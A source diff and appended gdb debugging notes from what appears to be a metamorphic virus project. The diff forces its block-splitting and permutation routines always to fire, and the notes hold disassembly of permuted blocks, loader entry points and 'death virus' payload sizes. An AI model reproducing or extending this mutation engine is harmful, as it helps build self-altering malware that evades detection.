@@ -38,7 +38,8 @@ bool		want_to_cut_clean(size_t block_length, size_t delta,
 	uint64_t	rand      = random_inrange(seed, 0, 100);
 
 	// return (closeness > rand);
-	return false;
+	// return false;
+	return true;
 }
 
 static bool	split_ref(struct safe_ptr *ref_origin,
@@ -165,7 +166,8 @@ static bool	shard_block(struct code_block *blocks[NBLOCKS], \
 
 static bool     want_to_permutate(uint64_t *seed)
 {
-	return random(seed) % 2;
+	// return random(seed) % 2;
+	return true;
 }
 
 /*
@@ -403,3 +405,101 @@ bool		permutate_blocks(struct safe_ptr input_code, \
 #endif
 	return true;
 }
+
+/*
+--------------------------------------------------------------------------------
+
+
+b *0x41daa9
+
+ls0:
+=> 0x000000000042233e:	55		push   rbp
+   0x000000000042233f:	48 89 e5	mov    rbp,rsp
+   0x0000000000422342:	48 83 ec 40	sub    rsp,0x40
+   0x0000000000422346:	48 8d 45 cb	lea    rax,[rbp-0x35]
+   0x000000000042234a:	48 8d 4d d6	lea    rcx,[rbp-0x2a]
+   0x000000000042234e:	48 89 7d f8	mov    QWORD PTR [rbp-0x8],rdi
+   0x0000000000422352:	c6 45 d6 2f	mov    BYTE PTR [rbp-0x2a],0x2f
+   0x0000000000422356:	c6 45 d7 74	mov    BYTE PTR [rbp-0x29],0x74
+   0x000000000042235a:	c6 45 d8 6d	mov    BYTE PTR [rbp-0x28],0x6d
+
+ls1:
+=> 0x0000000000426b5e:	55		push   rbp
+   0x0000000000426b5f:	48 89 e5	mov    rbp,rsp
+   0x0000000000426b62:	48 83 ec 40	sub    rsp,0x40
+   0x0000000000426b66:	e9 b9 6f ff ff	jmp    0x41db24
+   0x0000000000426b6b:	00 00		add    BYTE PTR [rax],al
+   0x0000000000426b6d:	00 00		add    BYTE PTR [rax],al
+   0x0000000000426b6f:	00 00		add    BYTE PTR [rax],al
+   0x0000000000426b71:	00 00		add    BYTE PTR [rax],al
+   0x0000000000426b73:	00 00		add    BYTE PTR [rax],al
+   0x0000000000426b75:	00 00		add    BYTE PTR [rax],al
+   0x0000000000426b77:	00 00		add    BYTE PTR [rax],al
+   0x0000000000426b79:	00 00		add    BYTE PTR [rax],al
+   0x0000000000426b7b:	00 00		add    BYTE PTR [rax],al
+   0x0000000000426b7d:	00 00		add    BYTE PTR [rax],al
+=> 0x000000000041db24:	48 8d 45 cb	lea    rax,[rbp-0x35]
+   0x000000000041db28:	48 8d 4d d6	lea    rcx,[rbp-0x2a]
+   0x000000000041db2c:	48 89 7d f8	mov    QWORD PTR [rbp-0x8],rdi
+   0x000000000041db30:	c6 45 d6 2f	mov    BYTE PTR [rbp-0x2a],0x2f
+   0x000000000041db34:	c6 45 d7 74	mov    BYTE PTR [rbp-0x29],0x74
+   0x000000000041db38:	c6 45 d8 6d	mov    BYTE PTR [rbp-0x28],0x6d
+   0x000000000041db3c:	c6 45 d9 70	mov    BYTE PTR [rbp-0x27],0x70
+   0x000000000041db40:	c6 45 da 2f	mov    BYTE PTR [rbp-0x26],0x2f
+
+ls2:
+=> 0x0000000000422338:	00 00		add    BYTE PTR [rax],al
+   0x000000000042233a:	00 00		add    BYTE PTR [rax],al
+   0x000000000042233c:	00 00		add    BYTE PTR [rax],al
+   0x000000000042233e:	00 00		add    BYTE PTR [rax],al
+   0x0000000000422340:	00 00		add    BYTE PTR [rax],al
+   0x0000000000422342:	00 00		add    BYTE PTR [rax],al
+   0x0000000000422344:	00 48 8d	add    BYTE PTR [rax-0x73],cl
+   0x0000000000422347:	45 cb		rex.RB retf
+   0x0000000000422349:	48 8d 4d d6	lea    rcx,[rbp-0x2a]
+   0x000000000042234d:	48 89 7d f8	mov    QWORD PTR [rbp-0x8],rdi
+   0x0000000000422351:	c6 45 d6 2f	mov    BYTE PTR [rbp-0x2a],0x2f
+   0x0000000000422355:	c6 45 d7 74	mov    BYTE PTR [rbp-0x29],0x74
+
+
+--------------------------------------------------------------------------------
+
+gdb-peda$ p/d 0x00007ffff7fc0f45-0x00007ffff7fb8b24
+$2 = 33825
+
+end_sled1:0x00007ffff7fc0f9d
+end_code :0x00007ffff7fc9421
+gdb-peda$ p/d 0x00007ffff7fc0f9d-0x00007ffff7fb8b24
+$1 = 33913
+
+gdb-peda$ disas loader_entry,+68048 (total payload)
+192
+
+=> death virus size: 67856
+
+virus:
+0x0000000000400210 <+0>:	push   rbp
+0x0000000000400211 <+1>:	mov    rbp,rsp
+0x0000000000400214 <+4>:	sub    rsp,0x40
+0x0000000000400218 <+8>:	mov    QWORD PTR [rbp-0x8],rdi
+0x000000000040021c <+12>:	mov    rdi,QWORD PTR [rbp-0x8]
+0x0000000000400220 <+16>:	call   0x409850 <log_virus_header>
+0x0000000000400225 <+21>:	lea    rdi,[rbp-0x35]
+0x0000000000400229 <+25>:	lea    rax,[rbp-0x2a]
+0x000000000040022d <+29>:	mov    BYTE PTR [rbp-0x2a],0x2f
+0x0000000000400231 <+33>:	mov    BYTE PTR [rbp-0x29],0x74
+0x0000000000400235 <+37>:	mov    BYTE PTR [rbp-0x28],0x6d
+0x0000000000400239 <+41>:	mov    BYTE PTR [rbp-0x27],0x70
+0x000000000040023d <+45>:	mov    BYTE PTR [rbp-0x26],0x2f
+
+input virus size: 67944
+
+67944-67856=88
+
+0x00007ffff7fc9423:	5d	pop    rbp
+0x00007ffff7fc9424:	c3	ret
+0x00007ffff7fc9425:	66 2e 0f 1f 84 00 00 00 00 00	nop    WORD PTR cs:[rax+rax*1+0x0]
+0x00007ffff7fc942f:	0f 1f 44 00 00	nop    DWORD PTR [rax+rax*1+0x0]
+0x00007ffff7fc9434:	00 00	add    BYTE PTR [rax],al
+0x00007ffff7fc9436:	00 00	add    BYTE PTR [rax],al
+*/
